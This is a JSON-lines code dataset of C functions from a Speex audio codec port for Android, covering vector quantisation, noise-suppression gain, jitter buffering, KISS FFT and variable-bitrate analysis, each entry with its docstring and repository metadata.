{"docstring": "/*Finds the indices of the n-best entries in a codebook*/\n", "func_signal": "void vq_nbest(spx_word16_t *in, const spx_word16_t *codebook, int len, int entries, spx_word32_t *E, int N, int *nbest, spx_word32_t *best_dist, char *stack)", "code": "{\n   int i,j,k,used;\n   used = 0;\n   for (i=0;i<entries;i++)\n   {\n      spx_word32_t dist=0;\n      for (j=0;j<len;j++)\n         dist = MAC16_16(dist,in[j],*codebook++);\n#ifdef FIXED_POINT\n      dist=SUB32(SHR32(E[i],1),dist);\n#else\n      dist=.5f*E[i]-dist;\n#endif\n      if (i<N || dist<best_dist[N-1])\n      {\n         for (k=N-1; (k >= 1) && (k > used || dist < best_dist[k-1]); k--)\n         {\n            best_dist[k]=best_dist[k-1];\n            nbest[k] = nbest[k-1];\n         }\n         best_dist[k]=dist;\n         nbest[k]=i;\n         used++;\n      }\n   }\n}", "path": "speexjni\\jni\\libspeex\\vq.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/* This function approximates the gain function \n   y = gamma(1.25)^2 * M(-.25;1;-x) / sqrt(x)  \n   which multiplied by xi/(1+xi) is the optimal gain\n   in the loudness domain ( sqrt[amplitude] )\n   Input in Q11 format, output in Q15\n*/\n", "func_signal": "static inline spx_word32_t hypergeom_gain(spx_word32_t xx)", "code": "{\n   int ind;\n   spx_word16_t frac;\n   /* Q13 table */\n   static const spx_word16_t table[21] = {\n       6730,  8357,  9868, 11267, 12563, 13770, 14898,\n      15959, 16961, 17911, 18816, 19682, 20512, 21311,\n      22082, 22827, 23549, 24250, 24931, 25594, 26241};\n      ind = SHR32(xx,10);\n      if (ind<0)\n         return Q15_ONE;\n      if (ind>19)\n         return ADD32(EXTEND32(Q15_ONE),EXTEND32(DIV32_16(QCONST32(.1296,23), SHR32(xx,EXPIN_SHIFT-SNR_SHIFT))));\n      frac = SHL32(xx-SHL32(ind,10),5);\n      return SHL32(DIV32_16(PSHR32(MULT16_16(Q15_ONE-frac,table[ind]) + MULT16_16(frac,table[ind+1]),7),(spx_sqrt(SHL32(xx,15)+6711))),7);\n}", "path": "speexjni\\jni\\libspeex\\preprocess.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/** Put one packet into the jitter buffer */\n", "func_signal": "EXPORT void jitter_buffer_put(JitterBuffer *jitter, const JitterBufferPacket *packet)", "code": "{\n   int i,j;\n   int late;\n   /*fprintf (stderr, \"put packet %d %d\\n\", timestamp, span);*/\n   \n   /* Cleanup buffer (remove old packets that weren't played) */\n   if (!jitter->reset_state)\n   {\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         /* Make sure we don't discard a \"just-late\" packet in case we want to play it next (if we interpolate). */\n         if (jitter->packets[i].data && LE32(jitter->packets[i].timestamp + jitter->packets[i].span, jitter->pointer_timestamp))\n         {\n            /*fprintf (stderr, \"cleaned (not played)\\n\");*/\n            if (jitter->destroy)\n               jitter->destroy(jitter->packets[i].data);\n            else\n               speex_free(jitter->packets[i].data);\n            jitter->packets[i].data = NULL;\n         }\n      }\n   }\n   \n   /*fprintf(stderr, \"arrival: %d %d %d\\n\", packet->timestamp, jitter->next_stop, jitter->pointer_timestamp);*/\n   /* Check if packet is late (could still be useful though) */\n   if (!jitter->reset_state && LT32(packet->timestamp, jitter->next_stop))\n   {\n      update_timings(jitter, ((spx_int32_t)packet->timestamp) - ((spx_int32_t)jitter->next_stop) - jitter->buffer_margin);\n      late = 1;\n   } else {\n      late = 0;\n   }\n\n   /* For some reason, the consumer has failed the last 20 fetches. Make sure this packet is\n    * used to resync. */\n   if (jitter->lost_count>20)\n   {\n      jitter_buffer_reset(jitter);\n   }\n   \n   /* Only insert the packet if it's not hopelessly late (i.e. totally useless) */\n   if (jitter->reset_state || GE32(packet->timestamp+packet->span+jitter->delay_step, jitter->pointer_timestamp))\n   {\n\n      /*Find an empty slot in the buffer*/\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         if (jitter->packets[i].data==NULL)\n            break;\n      }\n      \n      /*No place left in the buffer, need to make room for it by discarding the oldest packet */\n      if (i==SPEEX_JITTER_MAX_BUFFER_SIZE)\n      {\n         int earliest=jitter->packets[0].timestamp;\n         i=0;\n         for (j=1;j<SPEEX_JITTER_MAX_BUFFER_SIZE;j++)\n         {\n            if (!jitter->packets[i].data || LT32(jitter->packets[j].timestamp,earliest))\n            {\n               earliest = jitter->packets[j].timestamp;\n               i=j;\n            }\n         }\n         if (jitter->destroy)\n            jitter->destroy(jitter->packets[i].data);\n         else\n            speex_free(jitter->packets[i].data);\n         jitter->packets[i].data=NULL;\n         /*fprintf (stderr, \"Buffer is full, discarding earliest frame %d (currently at %d)\\n\", timestamp, jitter->pointer_timestamp);*/      \n      }\n   \n      /* Copy packet in buffer */\n      if (jitter->destroy)\n      {\n         jitter->packets[i].data = packet->data;\n      } else {\n         jitter->packets[i].data=(char*)speex_alloc(packet->len);\n         for (j=0;j<packet->len;j++)\n            jitter->packets[i].data[j]=packet->data[j];\n      }\n      jitter->packets[i].timestamp=packet->timestamp;\n      jitter->packets[i].span=packet->span;\n      jitter->packets[i].len=packet->len;\n      jitter->packets[i].sequence=packet->sequence;\n      jitter->packets[i].user_data=packet->user_data;\n      if (jitter->reset_state || late)\n         jitter->arrival[i] = 0;\n      else\n         jitter->arrival[i] = jitter->next_stop;\n   }\n   \n   \n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/** Initialise jitter buffer */\n", "func_signal": "EXPORT JitterBuffer *jitter_buffer_init(int step_size)", "code": "{\n   JitterBuffer *jitter = (JitterBuffer*)speex_alloc(sizeof(JitterBuffer));\n   if (jitter)\n   {\n      int i;\n      spx_int32_t tmp;\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n         jitter->packets[i].data=NULL;\n      jitter->delay_step = step_size;\n      jitter->concealment_size = step_size;\n      /*FIXME: Should this be 0 or 1?*/\n      jitter->buffer_margin = 0;\n      jitter->late_cutoff = 50;\n      jitter->destroy = NULL;\n      jitter->latency_tradeoff = 0;\n      jitter->auto_adjust = 1;\n      tmp = 4;\n      jitter_buffer_ctl(jitter, JITTER_BUFFER_SET_MAX_LATE_RATE, &tmp);\n      jitter_buffer_reset(jitter);\n   }\n   return jitter;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/* Add the timing of a new packet to the TimingBuffer */\n", "func_signal": "static void tb_add(struct TimingBuffer *tb, spx_int16_t timing)", "code": "{\n   int pos;\n   /* Discard packet that won't make it into the list because they're too early */\n   if (tb->filled >= MAX_TIMINGS && timing >= tb->timing[tb->filled-1])\n   {\n      tb->curr_count++;\n      return;\n   }\n   \n   /* Find where the timing info goes in the sorted list */\n   pos = 0;\n   /* FIXME: Do bisection instead of linear search */\n   while (pos<tb->filled && timing >= tb->timing[pos])\n   {\n      pos++;\n   }\n   \n   speex_assert(pos <= tb->filled && pos < MAX_TIMINGS);\n   \n   /* Shift everything so we can perform the insertion */\n   if (pos < tb->filled)\n   {\n      int move_size = tb->filled-pos;\n      if (tb->filled == MAX_TIMINGS)\n         move_size -= 1;\n      SPEEX_MOVE(&tb->timing[pos+1], &tb->timing[pos], move_size);\n      SPEEX_MOVE(&tb->counts[pos+1], &tb->counts[pos], move_size);\n   }\n   /* Insert */\n   tb->timing[pos] = timing;\n   tb->counts[pos] = tb->curr_count;\n   \n   tb->curr_count++;\n   if (tb->filled<MAX_TIMINGS)\n      tb->filled++;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/* Compute the gain floor based on different floors for the background noise and residual echo */\n", "func_signal": "static void compute_gain_floor(int noise_suppress, int effective_echo_suppress, spx_word32_t *noise, spx_word32_t *echo, spx_word16_t *gain_floor, int len)", "code": "{\n   int i;\n   \n   if (noise_suppress > effective_echo_suppress)\n   {\n      spx_word16_t noise_gain, gain_ratio;\n      noise_gain = EXTRACT16(MIN32(Q15_ONE,SHR32(spx_exp(MULT16_16(QCONST16(0.11513,11),noise_suppress)),1)));\n      gain_ratio = EXTRACT16(MIN32(Q15_ONE,SHR32(spx_exp(MULT16_16(QCONST16(.2302585f,11),effective_echo_suppress-noise_suppress)),1)));\n\n      /* gain_floor = sqrt [ (noise*noise_floor + echo*echo_floor) / (noise+echo) ] */\n      for (i=0;i<len;i++)\n         gain_floor[i] = MULT16_16_Q15(noise_gain,\n                                       spx_sqrt(SHL32(EXTEND32(DIV32_16_Q15(PSHR32(noise[i],NOISE_SHIFT) + MULT16_32_Q15(gain_ratio,echo[i]),\n                                             (1+PSHR32(noise[i],NOISE_SHIFT) + echo[i]) )),15)));\n   } else {\n      spx_word16_t echo_gain, gain_ratio;\n      echo_gain = EXTRACT16(MIN32(Q15_ONE,SHR32(spx_exp(MULT16_16(QCONST16(0.11513,11),effective_echo_suppress)),1)));\n      gain_ratio = EXTRACT16(MIN32(Q15_ONE,SHR32(spx_exp(MULT16_16(QCONST16(.2302585f,11),noise_suppress-effective_echo_suppress)),1)));\n\n      /* gain_floor = sqrt [ (noise*noise_floor + echo*echo_floor) / (noise+echo) ] */\n      for (i=0;i<len;i++)\n         gain_floor[i] = MULT16_16_Q15(echo_gain,\n                                       spx_sqrt(SHL32(EXTEND32(DIV32_16_Q15(MULT16_32_Q15(gain_ratio,PSHR32(noise[i],NOISE_SHIFT)) + echo[i],\n                                             (1+PSHR32(noise[i],NOISE_SHIFT) + echo[i]) )),15)));\n   }\n}", "path": "speexjni\\jni\\libspeex\\preprocess.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/* The guts header contains all the multiplication and addition macros that are defined for\n fixed or floating point complex numbers.  It also delares the kf_ internal functions.\n */\n", "func_signal": "static void kf_bfly2(\n        kiss_fft_cpx * Fout,\n        const size_t fstride,\n        const kiss_fft_cfg st,\n        int m,\n        int N,\n        int mm\n        )", "code": "{\n    kiss_fft_cpx * Fout2;\n    kiss_fft_cpx * tw1;\n    kiss_fft_cpx t;\n    if (!st->inverse) {\n       int i,j;\n       kiss_fft_cpx * Fout_beg = Fout;\n       for (i=0;i<N;i++)\n       {\n          Fout = Fout_beg + i*mm;\n          Fout2 = Fout + m;\n          tw1 = st->twiddles;\n          for(j=0;j<m;j++)\n          {\n             /* Almost the same as the code path below, except that we divide the input by two\n              (while keeping the best accuracy possible) */\n             spx_word32_t tr, ti;\n             tr = SHR32(SUB32(MULT16_16(Fout2->r , tw1->r),MULT16_16(Fout2->i , tw1->i)), 1);\n             ti = SHR32(ADD32(MULT16_16(Fout2->i , tw1->r),MULT16_16(Fout2->r , tw1->i)), 1);\n             tw1 += fstride;\n             Fout2->r = PSHR32(SUB32(SHL32(EXTEND32(Fout->r), 14), tr), 15);\n             Fout2->i = PSHR32(SUB32(SHL32(EXTEND32(Fout->i), 14), ti), 15);\n             Fout->r = PSHR32(ADD32(SHL32(EXTEND32(Fout->r), 14), tr), 15);\n             Fout->i = PSHR32(ADD32(SHL32(EXTEND32(Fout->i), 14), ti), 15);\n             ++Fout2;\n             ++Fout;\n          }\n       }\n    } else {\n       int i,j;\n       kiss_fft_cpx * Fout_beg = Fout;\n       for (i=0;i<N;i++)\n       {\n          Fout = Fout_beg + i*mm;\n          Fout2 = Fout + m;\n          tw1 = st->twiddles;\n          for(j=0;j<m;j++)\n          {\n             C_MUL (t,  *Fout2 , *tw1);\n             tw1 += fstride;\n             C_SUB( *Fout2 ,  *Fout , t );\n             C_ADDTO( *Fout ,  t );\n             ++Fout2;\n             ++Fout;\n          }\n       }\n    }\n}", "path": "speexjni\\jni\\libspeex\\kiss_fft.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/*Finds the indices of the n-best entries in a codebook with sign*/\n", "func_signal": "void vq_nbest_sign(spx_word16_t *in, const spx_word16_t *codebook, int len, int entries, spx_word32_t *E, int N, int *nbest, spx_word32_t *best_dist, char *stack)", "code": "{\n   int i,j,k, sign, used;\n   used=0;\n   for (i=0;i<entries;i++)\n   {\n      spx_word32_t dist=0;\n      for (j=0;j<len;j++)\n         dist = MAC16_16(dist,in[j],*codebook++);\n      if (dist>0)\n      {\n         sign=0;\n         dist=-dist;\n      } else\n      {\n         sign=1;\n      }\n#ifdef FIXED_POINT\n      dist = ADD32(dist,SHR32(E[i],1));\n#else\n      dist = ADD32(dist,.5f*E[i]);\n#endif\n      if (i<N || dist<best_dist[N-1])\n      {\n         for (k=N-1; (k >= 1) && (k > used || dist < best_dist[k-1]); k--)\n         {\n            best_dist[k]=best_dist[k-1];\n            nbest[k] = nbest[k-1];\n         }\n         best_dist[k]=dist;\n         nbest[k]=i;\n         used++;\n         if (sign)\n            nbest[k]+=entries;\n      }\n   }\n}", "path": "speexjni\\jni\\libspeex\\vq.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/*  facbuf is populated by p1,m1,p2,m2, ...\n    where \n    p[i] * m[i] = m[i-1]\n    m0 = n                  */\n", "func_signal": "static \nvoid kf_factor(int n,int * facbuf)", "code": "{\n    int p=4;\n\n    /*factor out powers of 4, powers of 2, then any remaining primes */\n    do {\n        while (n % p) {\n            switch (p) {\n                case 4: p = 2; break;\n                case 2: p = 3; break;\n                default: p += 2; break;\n            }\n            if (p>32000 || (spx_int32_t)p*(spx_int32_t)p > n)\n                p = n;          /* no more factors, skip to end */\n        }\n        n /= p;\n        *facbuf++ = p;\n        *facbuf++ = n;\n    } while (n > 1);\n}", "path": "speexjni\\jni\\libspeex\\kiss_fft.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/** Based on available data, this computes the optimal delay for the jitter buffer. \n   The optimised function is in timestamp units and is:\n   cost = delay + late_factor*[number of frames that would be late if we used that delay]\n   @param tb Array of buffers\n   @param late_factor Equivalent cost of a late frame (in timestamp units) \n */\n", "func_signal": "static spx_int16_t compute_opt_delay(JitterBuffer *jitter)", "code": "{\n   int i;\n   spx_int16_t opt=0;\n   spx_int32_t best_cost=0x7fffffff;\n   int late = 0;\n   int pos[MAX_BUFFERS];\n   int tot_count;\n   float late_factor;\n   int penalty_taken = 0;\n   int best = 0;\n   int worst = 0;\n   spx_int32_t deltaT;\n   struct TimingBuffer *tb;\n   \n   tb = jitter->_tb;\n   \n   /* Number of packet timings we have received (including those we didn't keep) */\n   tot_count = 0;\n   for (i=0;i<MAX_BUFFERS;i++)\n      tot_count += tb[i].curr_count;\n   if (tot_count==0)\n      return 0;\n   \n   /* Compute cost for one lost packet */\n   if (jitter->latency_tradeoff != 0)\n      late_factor = jitter->latency_tradeoff * 100.0f / tot_count;\n   else\n      late_factor = jitter->auto_tradeoff * jitter->window_size/tot_count;\n   \n   /*fprintf(stderr, \"late_factor = %f\\n\", late_factor);*/\n   for (i=0;i<MAX_BUFFERS;i++)\n      pos[i] = 0;\n   \n   /* Pick the TOP_DELAY \"latest\" packets (doesn't need to actually be late \n      for the current settings) */\n   for (i=0;i<TOP_DELAY;i++)\n   {\n      int j;\n      int next=-1;\n      int latest = 32767;\n      /* Pick latest amoung all sub-windows */\n      for (j=0;j<MAX_BUFFERS;j++)\n      {\n         if (pos[j] < tb[j].filled && tb[j].timing[pos[j]] < latest)\n         {\n            next = j;\n            latest = tb[j].timing[pos[j]];\n         }\n      }\n      if (next != -1)\n      {\n         spx_int32_t cost;\n         \n         if (i==0)\n            worst = latest;\n         best = latest;\n         latest = ROUND_DOWN(latest, jitter->delay_step);\n         pos[next]++;\n         \n         /* Actual cost function that tells us how bad using this delay would be */\n         cost = -latest + late_factor*late;\n         /*fprintf(stderr, \"cost %d = %d + %f * %d\\n\", cost, -latest, late_factor, late);*/\n         if (cost < best_cost)\n         {\n            best_cost = cost;\n            opt = latest;\n         }\n      } else {\n         break;\n      }\n      \n      /* For the next timing we will consider, there will be one more late packet to count */\n      late++;\n      /* Two-frame penalty if we're going to increase the amount of late frames (hysteresis) */\n      if (latest >= 0 && !penalty_taken)\n      {\n         penalty_taken = 1;\n         late+=4;\n      }\n   }\n   \n   deltaT = best-worst;\n   /* This is a default \"automatic latency tradeoff\" when none is provided */\n   jitter->auto_tradeoff = 1 + deltaT/TOP_DELAY;\n   /*fprintf(stderr, \"auto_tradeoff = %d (%d %d %d)\\n\", jitter->auto_tradeoff, best, worst, i);*/\n   \n   /* FIXME: Compute a short-term estimate too and combine with the long-term one */\n   \n   /* Prevents reducing the buffer size when we haven't really had much data */\n   if (tot_count < TOP_DELAY && opt > 0)\n      return 0;\n   return opt;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/*\n  This function should analyse the signal and decide how critical the\n  coding error will be perceptually. The following factors should be\n  taken into account:\n\n  -Attacks (positive energy derivative) should be coded with more bits\n\n  -Stationary voiced segments should receive more bits\n\n  -Segments with (very) low absolute energy should receive less bits (maybe\n  only shaped noise?)\n\n  -DTX for near-zero energy?\n\n  -Stationary fricative segments should have less bits\n\n  -Temporal masking: when energy slope is decreasing, decrease the bit-rate\n\n  -Decrease bit-rate for males (low pitch)?\n\n  -(wideband only) less bits in the high-band when signal is very \n  non-stationary (harder to notice high-frequency noise)???\n\n*/\n", "func_signal": "float vbr_analysis(VBRState *vbr, spx_word16_t *sig, int len, int pitch, float pitch_coef)", "code": "{\n   int i;\n   float ener=0, ener1=0, ener2=0;\n   float qual=7;\n   int va;\n   float log_energy;\n   float non_st=0;\n   float voicing;\n   float pow_ener;\n\n   for (i=0;i<len>>1;i++)\n      ener1 += ((float)sig[i])*sig[i];\n\n   for (i=len>>1;i<len;i++)\n      ener2 += ((float)sig[i])*sig[i];\n   ener=ener1+ener2;\n\n   log_energy = log(ener+MIN_ENERGY);\n   for (i=0;i<VBR_MEMORY_SIZE;i++)\n      non_st += sqr(log_energy-vbr->last_log_energy[i]);\n   non_st =  non_st/(30*VBR_MEMORY_SIZE);\n   if (non_st>1)\n      non_st=1;\n\n   voicing = 3*(pitch_coef-.4)*fabs(pitch_coef-.4);\n   vbr->average_energy = (1-vbr->energy_alpha)*vbr->average_energy + vbr->energy_alpha*ener;\n   vbr->noise_level=vbr->noise_accum/vbr->noise_accum_count;\n   pow_ener = pow(ener,NOISE_POW);\n   if (vbr->noise_accum_count<.06 && ener>MIN_ENERGY)\n      vbr->noise_accum = .05*pow_ener;\n\n   if ((voicing<.3 && non_st < .2 && pow_ener < 1.2*vbr->noise_level)\n       || (voicing<.3 && non_st < .05 && pow_ener < 1.5*vbr->noise_level)\n       || (voicing<.4 && non_st < .05 && pow_ener < 1.2*vbr->noise_level)\n       || (voicing<0 && non_st < .05))\n   {\n      float tmp;\n      va = 0;\n      vbr->consec_noise++;\n      if (pow_ener > 3*vbr->noise_level)\n         tmp = 3*vbr->noise_level;\n      else \n         tmp = pow_ener;\n      if (vbr->consec_noise>=4)\n      {\n         vbr->noise_accum = .95*vbr->noise_accum + .05*tmp;\n         vbr->noise_accum_count = .95*vbr->noise_accum_count + .05;\n      }\n   } else {\n      va = 1;\n      vbr->consec_noise=0;\n   }\n\n   if (pow_ener < vbr->noise_level && ener>MIN_ENERGY)\n   {\n      vbr->noise_accum = .95*vbr->noise_accum + .05*pow_ener;\n      vbr->noise_accum_count = .95*vbr->noise_accum_count + .05;      \n   }\n\n   /* Checking for very low absolute energy */\n   if (ener < 30000)\n   {\n      qual -= .7;\n      if (ener < 10000)\n         qual-=.7;\n      if (ener < 3000)\n         qual-=.7;\n   } else {\n      float short_diff, long_diff;\n      short_diff = log((ener+1)/(1+vbr->last_energy));\n      long_diff = log((ener+1)/(1+vbr->average_energy));\n      /*fprintf (stderr, \"%f %f\\n\", short_diff, long_diff);*/\n\n      if (long_diff<-5)\n         long_diff=-5;\n      if (long_diff>2)\n         long_diff=2;\n\n      if (long_diff>0)\n         qual += .6*long_diff;\n      if (long_diff<0)\n         qual += .5*long_diff;\n      if (short_diff>0)\n      {\n         if (short_diff>5)\n            short_diff=5;\n         qual += .5*short_diff;\n      }\n      /* Checking for energy increases */\n      if (ener2 > 1.6*ener1)\n         qual += .5;\n   }\n   vbr->last_energy = ener;\n   vbr->soft_pitch = .6*vbr->soft_pitch + .4*pitch_coef;\n   qual += 2.2*((pitch_coef-.4) + (vbr->soft_pitch-.4));\n\n   if (qual < vbr->last_quality)\n      qual = .5*qual + .5*vbr->last_quality;\n   if (qual<4)\n      qual=4;\n   if (qual>10)\n      qual=10;\n   \n   /*\n   if (vbr->consec_noise>=2)\n      qual-=1.3;\n   if (vbr->consec_noise>=5)\n      qual-=1.3;\n   if (vbr->consec_noise>=12)\n      qual-=1.3;\n   */\n   if (vbr->consec_noise>=3)\n      qual=4;\n\n   if (vbr->consec_noise)\n      qual -= 1.0 * (log(3.0 + vbr->consec_noise)-log(3));\n   if (qual<0)\n      qual=0;\n   \n   if (ener<60000)\n   {\n      if (vbr->consec_noise>2)\n         qual-=0.5*(log(3.0 + vbr->consec_noise)-log(3));\n      if (ener<10000&&vbr->consec_noise>2)\n         qual-=0.5*(log(3.0 + vbr->consec_noise)-log(3));\n      if (qual<0)\n         qual=0;\n      qual += .3*log(.0001+ener/60000.0);\n   }\n   if (qual<-1)\n      qual=-1;\n\n   /*printf (\"%f %f %f %f %d\\n\", qual, voicing, non_st, pow_ener/(.01+vbr->noise_level), va);*/\n\n   vbr->last_pitch_coef = pitch_coef;\n   vbr->last_quality = qual;\n\n   for (i=VBR_MEMORY_SIZE-1;i>0;i--)\n      vbr->last_log_energy[i] = vbr->last_log_energy[i-1];\n   vbr->last_log_energy[0] = log_energy;\n\n   /*printf (\"VBR: %f %f %f %d %f\\n\", (float)(log_energy-log(vbr->average_energy+MIN_ENERGY)), non_st, voicing, va, vbr->noise_level);*/\n\n   return qual;\n}", "path": "speexjni\\jni\\libspeex\\vbr.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/** Compensate all timings when we do an adjustment of the buffering */\n", "func_signal": "static void shift_timings(JitterBuffer *jitter, spx_int16_t amount)", "code": "{\n   int i, j;\n   for (i=0;i<MAX_BUFFERS;i++)\n   {\n      for (j=0;j<jitter->timeBuffers[i]->filled;j++)\n         jitter->timeBuffers[i]->timing[j] += amount;\n   }\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/* perform the butterfly for one stage of a mixed radix FFT */\n", "func_signal": "static void kf_bfly_generic(\n        kiss_fft_cpx * Fout,\n        const size_t fstride,\n        const kiss_fft_cfg st,\n        int m,\n        int p\n        )", "code": "{\n    int u,k,q1,q;\n    kiss_fft_cpx * twiddles = st->twiddles;\n    kiss_fft_cpx t;\n    kiss_fft_cpx scratchbuf[17];\n    int Norig = st->nfft;\n\n    /*CHECKBUF(scratchbuf,nscratchbuf,p);*/\n    if (p>17)\n       speex_fatal(\"KissFFT: max radix supported is 17\");\n    \n    for ( u=0; u<m; ++u ) {\n        k=u;\n        for ( q1=0 ; q1<p ; ++q1 ) {\n            scratchbuf[q1] = Fout[ k  ];\n        if (!st->inverse) {\n            C_FIXDIV(scratchbuf[q1],p);\n\t}\n            k += m;\n        }\n\n        k=u;\n        for ( q1=0 ; q1<p ; ++q1 ) {\n            int twidx=0;\n            Fout[ k ] = scratchbuf[0];\n            for (q=1;q<p;++q ) {\n                twidx += fstride * k;\n                if (twidx>=Norig) twidx-=Norig;\n                C_MUL(t,scratchbuf[q] , twiddles[twidx] );\n                C_ADDTO( Fout[ k ] ,t);\n            }\n            k += m;\n        }\n    }\n}", "path": "speexjni\\jni\\libspeex\\kiss_fft.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/* Used like the ioctl function to control the jitter buffer parameters */\n", "func_signal": "EXPORT int jitter_buffer_ctl(JitterBuffer *jitter, int request, void *ptr)", "code": "{\n   int count, i;\n   switch(request)\n   {\n      case JITTER_BUFFER_SET_MARGIN:\n         jitter->buffer_margin = *(spx_int32_t*)ptr;\n         break;\n      case JITTER_BUFFER_GET_MARGIN:\n         *(spx_int32_t*)ptr = jitter->buffer_margin;\n         break;\n      case JITTER_BUFFER_GET_AVALIABLE_COUNT:\n         count = 0;\n         for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n         {\n            if (jitter->packets[i].data && LE32(jitter->pointer_timestamp, jitter->packets[i].timestamp))\n            {\n               count++;\n            }\n         }\n         *(spx_int32_t*)ptr = count;\n         break;\n      case JITTER_BUFFER_SET_DESTROY_CALLBACK:\n         jitter->destroy = (void (*) (void *))ptr;\n         break;\n      case JITTER_BUFFER_GET_DESTROY_CALLBACK:\n         *(void (**) (void *))ptr = jitter->destroy;\n         break;\n      case JITTER_BUFFER_SET_DELAY_STEP:\n         jitter->delay_step = *(spx_int32_t*)ptr;\n         break;\n      case JITTER_BUFFER_GET_DELAY_STEP:\n         *(spx_int32_t*)ptr = jitter->delay_step;\n         break;\n      case JITTER_BUFFER_SET_CONCEALMENT_SIZE:\n         jitter->concealment_size = *(spx_int32_t*)ptr;\n         break;\n      case JITTER_BUFFER_GET_CONCEALMENT_SIZE:\n         *(spx_int32_t*)ptr = jitter->concealment_size;\n         break;\n      case JITTER_BUFFER_SET_MAX_LATE_RATE:\n         jitter->max_late_rate = *(spx_int32_t*)ptr;\n         jitter->window_size = 100*TOP_DELAY/jitter->max_late_rate;\n         jitter->subwindow_size = jitter->window_size/MAX_BUFFERS;\n         break;\n      case JITTER_BUFFER_GET_MAX_LATE_RATE:\n         *(spx_int32_t*)ptr = jitter->max_late_rate;\n         break;\n      case JITTER_BUFFER_SET_LATE_COST:\n         jitter->latency_tradeoff = *(spx_int32_t*)ptr;\n         break;\n      case JITTER_BUFFER_GET_LATE_COST:\n         *(spx_int32_t*)ptr = jitter->latency_tradeoff;\n         break;\n      default:\n         speex_warning_int(\"Unknown jitter_buffer_ctl request: \", request);\n         return -1;\n   }\n   return 0;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/*\n *\n * User-callable function to allocate all necessary storage space for the fft.\n *\n * The return value is a contiguous block of memory, allocated with malloc.  As such,\n * It can be freed with free(), rather than a kiss_fft-specific function.\n * */\n", "func_signal": "kiss_fft_cfg kiss_fft_alloc(int nfft,int inverse_fft,void * mem,size_t * lenmem )", "code": "{\n    kiss_fft_cfg st=NULL;\n    size_t memneeded = sizeof(struct kiss_fft_state)\n        + sizeof(kiss_fft_cpx)*(nfft-1); /* twiddle factors*/\n\n    if ( lenmem==NULL ) {\n        st = ( kiss_fft_cfg)KISS_FFT_MALLOC( memneeded );\n    }else{\n        if (mem != NULL && *lenmem >= memneeded)\n            st = (kiss_fft_cfg)mem;\n        *lenmem = memneeded;\n    }\n    if (st) {\n        int i;\n        st->nfft=nfft;\n        st->inverse = inverse_fft;\n#ifdef FIXED_POINT\n        for (i=0;i<nfft;++i) {\n            spx_word32_t phase = i;\n            if (!st->inverse)\n                phase = -phase;\n            kf_cexp2(st->twiddles+i, DIV32(SHL32(phase,17),nfft));\n        }\n#else\n        for (i=0;i<nfft;++i) {\n           const double pi=3.14159265358979323846264338327;\n           double phase = ( -2*pi /nfft ) * i;\n           if (st->inverse)\n              phase *= -1;\n           kf_cexp(st->twiddles+i, phase );\n        }\n#endif\n        kf_factor(nfft,st->factors);\n    }\n    return st;\n}", "path": "speexjni\\jni\\libspeex\\kiss_fft.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/* Let the jitter buffer know it's the right time to adjust the buffering delay to the network conditions */\n", "func_signal": "static int _jitter_buffer_update_delay(JitterBuffer *jitter, JitterBufferPacket *packet, spx_int32_t *start_offset)", "code": "{\n   spx_int16_t opt = compute_opt_delay(jitter);\n   /*fprintf(stderr, \"opt adjustment is %d \", opt);*/\n   \n   if (opt < 0)\n   {\n      shift_timings(jitter, -opt);\n      \n      jitter->pointer_timestamp += opt;\n      jitter->interp_requested = -opt;\n      /*fprintf (stderr, \"Decision to interpolate %d samples\\n\", -opt);*/\n   } else if (opt > 0)\n   {\n      shift_timings(jitter, -opt);\n      jitter->pointer_timestamp += opt;\n      /*fprintf (stderr, \"Decision to drop %d samples\\n\", opt);*/\n   }\n   \n   return opt;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/** Destroy jitter buffer */\n", "func_signal": "EXPORT void jitter_buffer_destroy(JitterBuffer *jitter)", "code": "{\n   jitter_buffer_reset(jitter);\n   speex_free(jitter);\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
